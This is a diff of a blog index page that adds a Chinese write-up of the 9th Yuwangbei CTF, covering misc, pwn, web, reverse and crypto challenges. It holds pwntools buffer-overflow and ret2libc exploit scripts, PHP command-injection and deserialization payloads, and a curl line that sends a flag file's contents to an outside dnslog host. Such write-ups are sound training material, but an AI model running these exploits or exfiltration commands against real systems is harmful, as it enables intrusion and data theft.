@@ -200,6 +200,193 @@
         
 
 <div class="post">
+    <a href="/2025/05/14/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">第九届御网杯部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/Writeup/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Writeup
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/14
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><h3 id="题目截图"><a href="#题目截图" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511141212846.png" alt="image-20250511141212846"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>拿到一个xlsx文档，winhex查看发现是压缩包，遂解压</p>
+<p><img src="image-20250511141331035.png" alt="image-20250511141331035"></p>
+<p>得到一个套娃.txt文件，还用winhex查看，找到docx的特征，猜测是docx文档，于是改格式为docx再打开</p>
+<p>给文字上红色，找到flag</p>
+<p><img src="image-20250511141440881.png" alt="image-20250511141440881"></p>
+<h2 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h2><h3 id="题目截图-1"><a href="#题目截图-1" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511141557054.png" alt="image-20250511141557054"></p>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>提示是异或，给了一串十六进制数，用cyberchef解并爆破即可</p>
+<p><img src="image-20250511141630042.png" alt="image-20250511141630042"></p>
+<p>注意到key&#x3D;39时得到flag</p>
+<h2 id="ez-picture"><a href="#ez-picture" class="headerlink" title="ez_picture"></a>ez_picture</h2><h3 id="题目截图-2"><a href="#题目截图-2" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511140601057.png" alt="image-20250511140601057"></p>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>stegsolve打开15.png</p>
+<p>看了一下各个颜色层，发现RGB的0层都有杂色，猜测是LSB隐写。</p>
+<p><img src="image-20250511140708981.png" alt="image-20250511140708981"></p>
+<p>得到了9个9，就是压缩包的密码，解压得到另一张图片</p>
+<p><img src="image-20250511140737889.png" alt="image-20250511140737889"></p>
+<p>在这看到了一个base64编码的字符串，解码得到flag</p>
+<p><img src="image-20250511140801055.png" alt="image-20250511140801055"></p>
+<h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h2><h3 id="题目截图-3"><a href="#题目截图-3" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511140929157.png" alt="image-20250511140929157"></p>
+<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>cyberchef用from decimal解出一个base64字符串</p>
+<p><img src="image-20250511141000743.png" alt="image-20250511141000743"></p>
+<p>拿去解出一个base58字符串</p>
+<p><img src="image-20250511141032372.png" alt="image-20250511141032372"></p>
+<p>再解，得到一个凯撒处理过的字符串</p>
+<p><img src="image-20250511141051797.png" alt="image-20250511141051797"></p>
+<p>凯撒枚举一下即可</p>
+<p><img src="image-20250511141103099.png" alt="image-20250511141103099"></p>
+<h2 id="光隙中的寄生密钥"><a href="#光隙中的寄生密钥" class="headerlink" title="光隙中的寄生密钥"></a>光隙中的寄生密钥</h2><h3 id="题目截图-4"><a href="#题目截图-4" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511151622062.png" alt="image-20250511151622062"></p>
+<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>两个文件合并的隐写</p>
+<p>binwalk分离出一个压缩包</p>
+<p>爆破出密码是9864</p>
+<p>得到一个文件，复制到cyberchef这样处理</p>
+<p><img src="image-20250511151714606.png" alt="image-20250511151714606"></p>
+<h2 id="被折叠的显影图纸"><a href="#被折叠的显影图纸" class="headerlink" title="被折叠的显影图纸"></a>被折叠的显影图纸</h2><h3 id="题目截图-5"><a href="#题目截图-5" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511152058037.png" alt="image-20250511152058037"></p>
+<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>如图所示，strings flag.xls | grep “flag”即可查询到flag</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><h3 id="题目截图-6"><a href="#题目截图-6" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511163909329.png" alt="image-20250511163909329"></p>
+<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><pre><code class="language-python">from pwn import *
+#p=process(&#39;./Canary&#39;)
+p=remote(&#39;47.105.113.86&#39;,30001)
+context.arch=&#39;amd64&#39;
+elf=ELF(&#39;./Canary&#39;)
+p.sendline(&#39;1&#39;)
+sleep(0.1)
+payload=b&#39;a&#39;*(0x70-4)+p32(0)+p64(0)+p64(0x40157E)
+p.sendline(payload)
+sleep(0.1)
+p.sendline(&#39;2&#39;)
+sleep(0.1)
+p.sendline(&#39;3&#39;)
+p.interactive()
+</code></pre>
+<h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="题目截图-7"><a href="#题目截图-7" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511164120958.png" alt="image-20250511164120958"></p>
+<h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><pre><code class="language-python">from pwn import *
+#p=process(&#39;./pwn&#39;)
+p=remote(&#39;47.105.113.86&#39;,30003)
+context.arch=&#39;amd64&#39;
+elf=ELF(&#39;./ez_pwn/pwn&#39;)
+libc=ELF(&#39;./ez_pwn/libc-2.31.so&#39;)
+pop_rdi_ret=0x4012c3
+pop_rsi_r15_ret=0x4012c1
+ret=0x40101a
+log.success(hex(elf.got[&#39;read&#39;]))
+payload=b&#39;a&#39;*0x28+p64(pop_rdi_ret)+p64(2)+p64(pop_rsi_r15_ret)+p64(elf.got[&#39;read&#39;])*2+p64(elf.plt[&#39;write&#39;])+p64(0x4011E2)
+#gdb.attach(p)
+#pause()
+p.send(payload)
+p.recvuntil(&#39;now.&#39;)
+libc_addr=u64(p.recvn(8))-libc.sym[&#39;read&#39;]
+system=libc_addr+libc.sym[&#39;system&#39;]
+binsh=libc_addr+next(libc.search(&#39;/bin/sh\x00&#39;))
+payload=b&#39;a&#39;*0x28+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
+p.send(payload)
+sleep(0.1)
+p.sendline(&#39;exec 1&gt;&amp;2&#39;)
+p.interactive()
+</code></pre>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h2><h3 id="题目截图-8"><a href="#题目截图-8" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511142005425.png" alt="image-20250511142005425"></p>
+<h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>直接搜索flag即可找到</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="YWB-Web-xff"><a href="#YWB-Web-xff" class="headerlink" title="YWB_Web_xff"></a>YWB_Web_xff</h2><h3 id="题目截图-9"><a href="#题目截图-9" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511154405455.png" alt="image-20250511154405455"></p>
+<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>XFF类型，burp抓包拦截加个X-Forwarded-For: 2.2.2.1</p>
+<p>然后拦截响应，即可得到flag</p>
+<h2 id="YWB-Web-命令执行过滤绕过"><a href="#YWB-Web-命令执行过滤绕过" class="headerlink" title="YWB_Web_命令执行过滤绕过"></a>YWB_Web_命令执行过滤绕过</h2><h3 id="题目截图-10"><a href="#题目截图-10" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511154705441.png" alt="image-20250511154705441"></p>
+<h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>第一个payload<code>http://47.105.113.86:40002/?cmd=print(file_get_contents(&#39;flag.php&#39;));</code>，在源代码中可以得到一个路径：<code>/tmp/flag.nisp</code></p>
+<p>然后再用这个payload:<code>http://47.105.113.86:40002/?cmd=print(file_get_contents(&#39;/tmp/flag.nisp&#39;));</code>即可得到flag</p>
+<h2 id="YWB-Web-反序列化"><a href="#YWB-Web-反序列化" class="headerlink" title="YWB_Web_反序列化"></a>YWB_Web_反序列化</h2><h3 id="题目截图-11"><a href="#题目截图-11" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511155009691.png" alt="image-20250511155009691"></p>
+<h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>需要构造一个经过正确反序列化的<code>mylogin</code>对象，使得其<code>pass</code>属性值为<code>myzS@11wawq</code>，从而触发<code>exit()</code>退出并可能返回flag</p>
+<ol>
+<li><p><strong>代码逻辑梳理</strong>：</p>
+<ul>
+<li><strong>filter函数</strong>：将输入中的<code>flag</code>和<code>php</code>替换为<code>hack</code>。</li>
+<li><strong>反序列化检查</strong>：POST提交的<code>msg</code>参数经<code>filter</code>处理后反序列化为对象，并检查是否为<code>mylogin</code>实例且<code>pass</code>是否匹配目标值<code>myzS@11wawq</code>。</li>
+<li><strong>目标条件</strong>：若<code>pass</code>正确，触发<code>exit()</code>，可能隐藏flag的输出。</li>
+</ul>
+</li>
+<li><p><strong>绕过filter过滤</strong>：</p>
+<ul>
+<li>构造的序列化字符串需<strong>不包含</strong><code>flag</code>或<code>php</code>，避免被替换破坏结构。</li>
+<li>确保反序列化后的对象属性<code>pass</code>值正确。</li>
+</ul>
+</li>
+<li><p><strong>构造Payload</strong>：</p>
+<ul>
+<li><p>序列化一个<code>mylogin</code>对象，设置<code>pass</code>为<code>myzS@11wawq</code>，且不涉及被过滤的关键词。</p>
+</li>
+<li><p>生成的序列化字符串：</p>
+<pre><code>O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:11:&quot;myzS@11wawq&quot;;&#125;
+</code></pre>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="YWB-Web-未授权访问"><a href="#YWB-Web-未授权访问" class="headerlink" title="YWB_Web_未授权访问"></a>YWB_Web_未授权访问</h2><h3 id="题目截图-12"><a href="#题目截图-12" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511161509149.png" alt="image-20250511161509149"></p>
+<h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>只校验了isAdmin和name字段是不是Admin。</p>
+<p>把请求头中cookie修改一下，改为了<code>O:5:&quot;Admin&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Admin&quot;;s:7:&quot;isAdmin&quot;;b:1;&#125;</code></p>
+<p>然后发包即可得到flag</p>
+<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><h2 id="题目截图-13"><a href="#题目截图-13" class="headerlink" title="题目截图"></a>题目截图</h2><p><img src="image-20250511162910707.png" alt="image-20250511162910707"></p>
+<h2 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h2><p>dnslog外带，需要服务器向dnslog服务器发请求</p>
+<p>payload:</p>
+<pre><code>cmd=curl `tac /flag.txt`.n6yw9e4z.eyes.sh
+</code></pre>
+<p>POST上去即可</p>
+<p>然后在dnslog服务上就能看到flag了</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><h3 id="题目截图-14"><a href="#题目截图-14" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511142433147.png" alt="image-20250511142433147"></p>
+<h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h3><p>N可以分解出p,q，又有了e，c，可以轻而易举得到明文M，进而得到flag，然后按照题目要求修改对应的数字3为4。</p>
+<h2 id="cry-rsa"><a href="#cry-rsa" class="headerlink" title="cry_rsa"></a>cry_rsa</h2><h3 id="题目截图-15"><a href="#题目截图-15" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511142655157.png" alt="image-20250511142655157"></p>
+<h3 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h3><p>有了p，q，e，可以轻而易举算出D，然后按照题目要求+2即可得到flag</p>
+<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><h3 id="题目截图-16"><a href="#题目截图-16" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511155746942.png" alt="image-20250511155746942"></p>
+<h3 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h3><p>垃圾邮件+base64加密，按顺序解密即可</p>
+<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><h3 id="题目截图-17"><a href="#题目截图-17" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511143019818.png" alt="image-20250511143019818"></p>
+<h3 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h3><p>脑洞题，根据题干猜测是pie，然后偏移3位得到flag</p>
+<h2 id="草甸方阵的密语"><a href="#草甸方阵的密语" class="headerlink" title="草甸方阵的密语"></a>草甸方阵的密语</h2><h3 id="题目截图-18"><a href="#题目截图-18" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511143230675.png" alt="image-20250511143230675"></p>
+<h3 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h3><p>先凯撒后栅栏，两个爆破即可得到flag</p>
+<h2 id="easy-签到题"><a href="#easy-签到题" class="headerlink" title="easy-签到题"></a>easy-签到题</h2><h3 id="题目截图-19"><a href="#题目截图-19" class="headerlink" title="题目截图"></a>题目截图</h3><p><img src="image-20250511143414380.png" alt="image-20250511143414380"></p>
+<h3 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h3><p>base64-base32-base16按顺序解出flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Writeup/" style="color: #00bcd4">Writeup</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/05/14/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/04/27/CTF%E6%81%A9%E6%83%85%E8%AF%BE%E6%96%87/">
         <h2 class="post-title">CTF恩情课文</h2>
     </a>
@@ -240,7 +427,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #ffa2c4">弔文</a>
+            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #ff7d73">弔文</a>
         </span>
         
     </div>
@@ -288,7 +475,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #00bcd4">弔文</a>
+            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #ffa2c4">弔文</a>
         </span>
         
     </div>
@@ -384,7 +571,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #00bcd4">弔文</a>
+            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #03a9f4">弔文</a>
         </span>
         
     </div>
@@ -434,7 +621,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #ffa2c4">弔文</a>
+            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #03a9f4">弔文</a>
         </span>
         
     </div>
@@ -483,7 +670,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #ffa2c4">弔文</a>
+            <a href="/tags/%E5%BC%94%E6%96%87/" style="color: #00bcd4">弔文</a>
         </span>
         
     </div>
@@ -531,22 +718,22 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #ffa2c4">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #03a9f4">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Misc/" style="color: #ff7d73">Misc</a>
+            <a href="/tags/Misc/" style="color: #ffa2c4">Misc</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Pwn/" style="color: #00a596">Pwn</a>
+            <a href="/tags/Pwn/" style="color: #ff7d73">Pwn</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+            <a href="/tags/CTF/" style="color: #ffa2c4">CTF</a>
         </span>
         
         <span class="tag">
@@ -561,7 +748,7 @@
         
         <span class="tag">
             
-            <a href="/tags/Web/" style="color: #00a596">Web</a>
+            <a href="/tags/Web/" style="color: #03a9f4">Web</a>
         </span>
         
     </div>
@@ -609,37 +796,37 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #03a9f4">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Misc/" style="color: #00a596">Misc</a>
+            <a href="/tags/Misc/" style="color: #ffa2c4">Misc</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Pwn/" style="color: #ffa2c4">Pwn</a>
+            <a href="/tags/Pwn/" style="color: #03a9f4">Pwn</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/CTF/" style="color: #00a596">CTF</a>
+            <a href="/tags/CTF/" style="color: #ff7d73">CTF</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Crypto/" style="color: #00bcd4">Crypto</a>
+            <a href="/tags/Crypto/" style="color: #03a9f4">Crypto</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Reverse/" style="color: #00a596">Reverse</a>
+            <a href="/tags/Reverse/" style="color: #ff7d73">Reverse</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Web/" style="color: #ff7d73">Web</a>
+            <a href="/tags/Web/" style="color: #03a9f4">Web</a>
         </span>
         
     </div>
@@ -687,60 +874,7 @@
         
         <span class="tag">
             
-            <a href="/tags/Writeup/" style="color: #00a596">Writeup</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">网安</a>
-        </span>
-        
-    </div>
-    <a href="/2025/04/02/Matrix-Breakout-2-Morpheus-%E5%AE%9E%E6%88%98/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/03/31/mercy%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/">
-        <h2 class="post-title">mercy靶机实战</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E7%AC%94%E8%AE%B0/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                笔记
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/3/31
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>mercy靶机实战</p>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/Writeup/" style="color: #ffa2c4">Writeup</a>
+            <a href="/tags/Writeup/" style="color: #ff7d73">Writeup</a>
         </span>
         
         <span class="tag">
@@ -749,7 +883,7 @@
         </span>
         
     </div>
-    <a href="/2025/03/31/mercy%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" class="go-post">阅读全文</a>
+    <a href="/2025/04/02/Matrix-Breakout-2-Morpheus-%E5%AE%9E%E6%88%98/" class="go-post">阅读全文</a>
 </div>
 
 
